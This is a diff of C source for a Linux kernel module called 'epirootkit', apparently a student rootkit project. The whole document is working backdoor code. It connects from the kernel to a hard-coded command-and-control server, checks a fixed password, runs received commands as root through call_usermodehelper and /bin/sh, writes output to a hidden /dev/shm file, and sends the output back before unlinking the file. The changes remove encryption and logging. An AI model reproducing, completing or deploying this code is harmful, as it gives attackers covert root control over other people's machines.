@@ -31,10 +31,10 @@ static struct rootkit_config {
     char password[32];
 } config = {
     .port = 4242,
-    .server_ip = "192.168.15.6",  // À modifier avec votre IP
+    .server_ip = "192.168.15.6",
     .buffer_size = 2048,
     .xor_key = "epirootkit",
-    .password = "epirootkit\n"    // Notez le \n pour correspondre au client
+    .password = "epirootkit\n"
 };
 
 static struct socket *g_sock = NULL;
@@ -58,10 +58,8 @@ static int connect_to_c2_server(void) {
     int err;
 
     err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
-    if (err < 0) {
-        printk(KERN_ERR "epirootkit: Failed to create socket\n");
+    if (err < 0)
         return err;
-    }
 
     memset(&server, 0, sizeof(server));
     server.sin_family = AF_INET;
@@ -69,74 +67,34 @@ static int connect_to_c2_server(void) {
     server.sin_addr.s_addr = in_aton(config.server_ip);
 
     err = g_sock->ops->connect(g_sock, (struct sockaddr *)&server,
-                             sizeof(server), O_NONBLOCK);
+                               sizeof(server), O_NONBLOCK);
     if (err && err != -EINPROGRESS) {
-        printk(KERN_ERR "epirootkit: Connection failed (error %d)\n", err);
         sock_release(g_sock);
         g_sock = NULL;
         return err;
     }
 
-    printk(KERN_INFO "epirootkit: Connected to C2 server at %s:%d\n",
-           config.server_ip, config.port);
+    printk(KERN_INFO "epirootkit: Connected to C2 server at %s:%d\n", config.server_ip, config.port);
     return 0;
 }
 
 static int send_to_c2(const char *msg, size_t len) {
     struct kvec iov;
     struct msghdr msg_hdr = {0};
-    char *encrypted;
-    int sent, i;
-    size_t key_len;
+    int sent;
 
-    if (!g_sock) {
-        pr_err("epirootkit: Not connected, cannot send\n");
+    if (!g_sock)
         return -ENOTCONN;
-    }
 
-    key_len = strlen(config.xor_key);
-    encrypted = kmalloc(len, GFP_KERNEL);
-    if (!encrypted) {
-        pr_err("epirootkit: Failed to allocate memory for encrypted message\n");
-        return -ENOMEM;
-    }
-
-    // Debug print input
-    pr_debug("epirootkit: Sending message (len=%zu): ", len);
-    for (i = 0; i < len && i < 32; i++) {
-        pr_debug("%02x ", (unsigned char)msg[i]);
-    }
-    pr_debug("\n");
-
-    // Encrypt the message
-    for (i = 0; i < len; i++) {
-        unsigned char key_byte = config.xor_key[i % key_len];
-        unsigned char msg_byte = msg[i];
-        encrypted[i] = msg_byte ^ key_byte;
-    }
-
-    // Debug print output
-    pr_debug("epirootkit: Encrypted message: ");
-    for (i = 0; i < len && i < 32; i++) {
-        pr_debug("%02x ", (unsigned char)encrypted[i]);
-    }
-    pr_debug("\n");
-
-    iov.iov_base = encrypted;
+    iov.iov_base = (char *)msg;
     iov.iov_len = len;
 
     sent = kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
-    if (sent < 0) {
-        pr_err("epirootkit: Send failed (error %d)\n", sent);
-    }
-
-    kfree(encrypted);
     return sent;
 }
 
 static int command_loop(void *data) {
     char buffer[2048];
-    char decrypted[2048];
     struct kvec iov;
     struct msghdr msg_hdr = {0};
     int len, authenticated = 0;
@@ -148,10 +106,7 @@ static int command_loop(void *data) {
     loff_t pos;
     ssize_t rlen;
     char outbuf[1024];
-    const char *tmp_output_path = "/tmp/.rk_out";
-    int i;
-
-    printk(KERN_INFO "epirootkit: command_loop started\n");
+    const char *tmp_output_path = "/dev/shm/.rk";
 
     while (!kthread_should_stop()) {
         memset(buffer, 0, sizeof(buffer));
@@ -159,61 +114,48 @@ static int command_loop(void *data) {
         iov.iov_len = sizeof(buffer) - 1;
 
         len = kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, sizeof(buffer) - 1, MSG_DONTWAIT);
-        if (len <= 0) {
+
+        if (len == 0) {
+            sock_release(g_sock);
+            g_sock = NULL;
+            notify_connection_state(0);
+            break;
+        }
+
+        if (len < 0) {
             msleep(500);
             continue;
         }
 
-        // Debug print received data
-        pr_debug("epirootkit: Received encrypted data (len=%d): ", len);
-        for (i = 0; i < len && i < 32; i++) {
-            pr_debug("%02x ", (unsigned char)buffer[i]);
-        }
-        pr_debug("\n");
-
-        // Déchiffrement XOR
-        memset(decrypted, 0, sizeof(decrypted));
-        for (i = 0; i < len; i++) {
-            unsigned char key_byte = config.xor_key[i % strlen(config.xor_key)];
-            decrypted[i] = buffer[i] ^ key_byte;
-        }
-        decrypted[len] = '\0';
-
-        // Debug print decrypted data
-        pr_debug("epirootkit: Decrypted data: %s\n", decrypted);
+        buffer[len] = '\0';
 
         if (!authenticated) {
-            printk(KERN_INFO "epirootkit: Received auth attempt: '%s'\n", decrypted);
-            // Compare before stripping newlines for authentication
-            if (strncmp(decrypted, config.password, strlen(config.password)) == 0) {
+            if (strcmp(buffer, config.password) == 0) {
                 authenticated = 1;
-                send_to_c2("AUTH OK\n--EOF--\n", 12);
-                printk(KERN_INFO "epirootkit: Authentication successful\n");
+                send_to_c2("AUTH OK\n--EOF--\n", 14);
             } else {
-                send_to_c2("AUTH FAIL\n--EOF--\n", 14);
-                printk(KERN_WARNING "epirootkit: Authentication failed, received: '%s'\n", decrypted);
+                send_to_c2("AUTH FAIL\n--EOF--\n", 16);
             }
             continue;
         }
 
-        // Strip newlines only after authentication check
-        size_t input_len = strcspn(decrypted, "\r\n");
-        decrypted[input_len] = '\0';
+        size_t input_len = strcspn(buffer, "\r\n");
+        buffer[input_len] = '\0';
 
-        if (strncmp(decrypted, "cd ", 3) == 0) {
-            const char *path = decrypted + 3;
-            if (strlen(path) > 0 && strlen(path) < sizeof(working_directory)) {
+        if (strncmp(buffer, "cd", 2) == 0) {
+            const char *path = buffer + 2;
+            while (*path == ' ')
+                path++;
+            if (*path && strlen(path) < sizeof(working_directory)) {
                 strncpy(working_directory, path, sizeof(working_directory) - 1);
                 working_directory[sizeof(working_directory) - 1] = '\0';
-                printk(KERN_INFO "epirootkit: Changed directory to %s\n", working_directory);
             }
             send_to_c2("--EOF--\n", 8);
             continue;
         }
 
-        if (strcmp(decrypted, "exit") == 0) {
-            send_to_c2("Shutting down\n--EOF--\n", 20);
-            printk(KERN_INFO "epirootkit: Received exit command\n");
+        if (strcmp(buffer, "exit") == 0) {
+            send_to_c2("Shutting down\n--EOF--\n", 22);
             if (g_sock) {
                 sock_release(g_sock);
                 g_sock = NULL;
@@ -222,60 +164,49 @@ static int command_loop(void *data) {
             do_exit(0);
         }
 
-        printk(KERN_INFO "epirootkit: Executing command: %s\n", decrypted);
-
-        // Use /bin/bash instead of /bin/sh for better command support
-        argv[0] = "/bin/bash";
+        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, buffer, tmp_output_path);
+        argv[0] = "/bin/sh";
         argv[1] = "-c";
-        // Build command with proper redirection
-        if (strlen(working_directory) > 1) {
-            snprintf(full_cmd, sizeof(full_cmd), "cd %s 2>/dev/null && %s 2>&1",
-                    working_directory, decrypted);
-        } else {
-            snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", decrypted);
-        }
         argv[2] = full_cmd;
         argv[3] = NULL;
-
         envp[0] = "HOME=/";
         envp[1] = "TERM=linux";
-        envp[2] = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
+        envp[2] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
         envp[3] = NULL;
 
-        // Execute command
-        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
         if (ret != 0) {
-            printk(KERN_ERR "epirootkit: Command execution failed (error %d)\n", ret);
-            send_to_c2("Command execution failed\n--EOF--\n", 31);
+            send_to_c2("(exec error)\n--EOF--\n", 21);
             continue;
         }
 
-        // Read command output
+        int sent_output = 0;
         f = filp_open(tmp_output_path, O_RDONLY, 0);
-        if (IS_ERR(f)) {
-            send_to_c2("(no output)\n--EOF--\n", 18);
-            continue;
-        }
-
-        pos = 0;
-        do {
-            memset(outbuf, 0, sizeof(outbuf));
-            rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
-            if (rlen > 0) {
-                send_to_c2(outbuf, rlen);
-                pos += rlen;
-            }
-        } while (rlen > 0);
-
-        filp_close(f, NULL);
-        send_to_c2("--EOF--\n", 8);
-
-        // Try to remove the temporary file
-        f = filp_open(tmp_output_path, O_WRONLY | O_TRUNC, 0);
         if (!IS_ERR(f)) {
+            pos = 0;
+            do {
+                memset(outbuf, 0, sizeof(outbuf));
+                rlen = kernel_read(f, pos, outbuf, sizeof(outbuf) - 1);
+                if (rlen > 0) {
+                    send_to_c2(outbuf, rlen);
+                    pos += rlen;
+                    sent_output = 1;
+                }
+            } while (rlen > 0);
             filp_close(f, NULL);
+
+            struct path path;
+            if (kern_path(tmp_output_path, 0, &path) == 0)
+                vfs_unlink(path.dentry->d_parent->d_inode, path.dentry, NULL);
         }
+
+        if (!sent_output)
+            send_to_c2("(no output)\n", 12);
+
+        send_to_c2("--EOF--\n", 8);
     }
+
+    g_cmd_thread = NULL;
     return 0;
 }
 
@@ -286,40 +217,37 @@ static int connection_loop(void *data) {
             continue;
         }
 
-        printk(KERN_INFO "epirootkit: Attempting to connect to C2 server...\n");
         if (connect_to_c2_server() == 0) {
             notify_connection_state(1);
             if (!g_cmd_thread) {
                 g_cmd_thread = kthread_run(command_loop, NULL, "rk_cmd");
                 if (IS_ERR(g_cmd_thread)) {
-                    printk(KERN_ERR "epirootkit: Failed to start command thread\n");
                     g_cmd_thread = NULL;
                     sock_release(g_sock);
                     g_sock = NULL;
                     notify_connection_state(0);
                 }
             }
-        } else {
-            msleep(3000);
         }
+        msleep(3000);
     }
     return 0;
 }
 
 static int __init epirootkit_init(void) {
-    printk(KERN_INFO "epirootkit: Initializing...\n");
+    pr_info("epirootkit: Initializing...\n");
     g_sock = NULL;
     g_cmd_thread = NULL;
     g_conn_thread = kthread_run(connection_loop, NULL, "rk_conn");
     if (IS_ERR(g_conn_thread)) {
-        printk(KERN_ERR "epirootkit: Failed to start connection thread\n");
+        pr_err("epirootkit: Failed to start connection_loop\n");
         return PTR_ERR(g_conn_thread);
     }
     return 0;
 }
 
 static void __exit epirootkit_exit(void) {
-    printk(KERN_INFO "epirootkit: Cleaning up module...\n");
+    pr_info("epirootkit: Cleaning up module...\n");
 
     if (g_cmd_thread) {
         kthread_stop(g_cmd_thread);
@@ -334,7 +262,7 @@ static void __exit epirootkit_exit(void) {
         g_sock = NULL;
         notify_connection_state(0);
     }
-    printk(KERN_INFO "epirootkit: Cleanup complete\n");
+    pr_info("epirootkit: Cleanup complete\n");
 }
 
 module_init(epirootkit_init);
